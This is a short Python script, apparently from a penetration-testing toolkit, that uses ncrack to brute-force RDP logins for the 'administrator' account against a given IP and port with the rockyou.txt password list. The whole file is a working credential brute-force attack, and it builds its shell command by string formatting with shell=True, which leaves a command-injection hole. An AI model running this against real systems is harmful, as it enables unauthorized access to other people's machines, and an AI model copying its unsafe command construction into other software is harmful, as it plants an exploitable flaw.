#!/usr/bin/env python

import subprocess

def rdp_bruteforce(ip_address, port, passwordfile):
    print ('\t\tPerforming RDP Brute Force on IP: %s' %ip_address)

    RDP_BRUTE = \
        'ncrack -u administrator -P %s -p %s %s -oN ./%s/RDP/%s_ncrack_RDP_result.txt' \
        % (passwordfile, port, ip_address, ip_address,ip_address)
    RDP_BRUTE_RESULT = subprocess.check_output(RDP_BRUTE, shell=True)


def main(ip_address,port):
	passwordfile = "wordlist/rockyou.txt"
	rdp_bruteforce(ip_address,port,passwordfile)

# if __name__ == '__main__':
# 	rdp_bruteforce('192.168.1.52', 3389, '/root/Desktop/testing/2.txt')